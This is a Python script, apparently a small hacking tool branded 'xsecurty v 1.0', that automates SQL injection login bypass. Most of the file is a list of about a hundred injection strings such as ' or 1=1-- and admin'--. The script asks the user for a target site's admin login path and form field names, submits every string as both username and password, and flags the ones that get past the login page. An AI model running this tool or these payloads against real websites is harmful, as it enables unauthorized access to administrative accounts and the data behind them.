 import requests as loginpass
import re

icon ='''
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒
▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄░░▒▒▒▒▒
▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██▌░░▒▒▒▒
▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▄▄███▀░░░░▒▒▒
▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░█████░▄█░░░░▒▒
▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░▄████████▀░░░░▒▒
▒▒░░░░░░░░░░░░░░░░░░░░░░░░▄█████████░░░░░░░▒
▒░░░░░░░░░░░░░░░░░░░░░░░░░░▄███████▌░░░░░░░▒
▒░░░░░░░░░░░░░░░░░░░░░░░░▄█████████░░░░░░░░▒
▒░░░░░░░░░░░░░░░░░░░░░▄███████████▌░░░░░░░░▒
▒░░░░░░░░░░░░░░░▄▄▄▄██████████████▌░░░░░░░░▒
▒░░░░░░░░░░░▄▄███████████████████▌░░░░░░░░░▒
▒░░░░░░░░░▄██████live:xsecurty███▌░░░░░░░░░▒
▒░░░░░░░░██████████████v 1.0█████░░░░░░░░░░▒
▒█░░░░░▐██████████▌░▀▀███████████░░░░░░░░░░▒
▐██░░░▄██████████▌░░░░░░░░░▀██▐█▌░░░░░░░░░▒▒
▒██████░█████████░░░░░░░░░░░▐█▐█▌░░░░░░░░░▒▒
▒▒▀▀▀▀░░░██████▀░░░░░░░░░░░░▐█▐█▌░░░░░░░░▒▒▒
▒▒▒▒▒░░░░▐█████▌░░░░░░░░░░░░▐█▐█▌░░░░░░░▒▒▒▒
▒▒▒▒▒▒░░░░███▀██░░░░░░░░░░░░░█░█▌░░░░░░▒▒▒▒▒
▒▒▒▒▒▒▒▒░▐██░░░██░░░░░░░░▄▄████████▄▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒██▌░░░░█▄░░░░░░▄███████████████████
▒▒▒▒▒▒▒▒▒▐██▒▒░░░██▄▄███████████████████████
▒▒▒▒▒▒▒▒▒▒▐██▒▒▄████████████████████████████
▒▒▒▒▒▒▒▒▒▒▄▄████████████████████████████████
████████████████████████████████████████████
'''
print(icon)

############################
#       Start Program      #
############################
check = """123
223
321
'OR'1=1
'OR'1=1-- -
' or '1'='1
' or 'x'='x
' or 0=0 --
" or 0=0 --
or 0=0 --
' or 0=0 #
" or 0=0 #
or 0=0 #
' or 'x'='x
" or "x"="x
') or ('x'='x
' or 1=1--
" or 1=1--
or 1=1--
' or a=a--
" or "a"="a
') or ('a'='a
") or ("a"="a
hi" or "a"="a
hi" or 1=1 --
hi' or 1=1 --
'or'1=1'
==
and 1=1--
and 1=1
' or 'one'='one--
' or 'one'='one
' and 'one'='one
' and 'one'='one--
1') and '1'='1--
admin' --
admin' #
admin'/*
or 1=1--
or 1=1#
or 1=1/*
) or '1'='1--
) or ('1'='1--
' or '1'='1
' or 'x'='x
' or 0=0 --
" or 0=0 --
or 0=0 --
' or 0=0 #
" or 0=0 #
or 0=0 #
' or 'x'='x
" or "x"="x
') or ('x'='x
' or 1=1--
" or 1=1--
or 1=1--
' or a=a--
" or "a"="a
') or ('a'='a
") or ("a"="a
hi" or "a"="a
hi" or 1=1 --
hi' or 1=1 --
'or'1=1'
 'or''='
 admin'--
 ' or 0=0 --
 " or 0=0 --
 or 0=0 --
 ' or 0=0 #
 " or 0=0 #
 or 0=0 #
 ' or 'x'='x
 " or "x"="x
 ') or ('x'='x
 ' or 1=1--
 " or 1=1--
 or 1=1--
 ' or a=a--
 " or "a"="a
 ') or ('a'='a
 ") or ("a"="a
 hi" or "a"="a
 hi" or 1=1 --
 hi' or 1=1 --
 hi' or 'a'='a
 hi') or ('a'='a
 hi") or ("a"="a"""

listpass = []
def bypass(login):
    for pasword in login.split('\n'):
        listpass.append(pasword)

bypass(check)


def Login(url,path,inuser,inpass,test,err):
    session = loginpass.Session()
    session.get("http://"+url+path)
    session.headers = {
        "Host": str(url),
        "User-Agent": "Mozilla/5.0(Windows NT 6.3;WOW64;rv:46.0)Gecko/20100101Firefox/46.0",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": "http://"+url+path
    }
    logindata = {inuser:test,inpass:test}
    uurl = "http://"+url+path
    login_post = session.post(uurl,data=logindata)
    if err in login_post.text:
        print("[-]"+test)
    else:
        print("[+]" + test )


input_url = input("Please Enter Url ex:www.xxx.com Dont Add http:// >>> ")
input_path = input("please Enter Path admin ex: /admin/ >>> ")
input_user = input("Please Add input user ex: username >>> ")
input_pwd = input("please Add input password ex: pwd >>> ")
input_err = input("please Add err in page login or note ex: name=\"username\" >>> ")
for lis in listpass:
    Login(url=input_url, path=input_path, inuser=input_user, inpass=input_pwd, test=lis,
          err=input_err)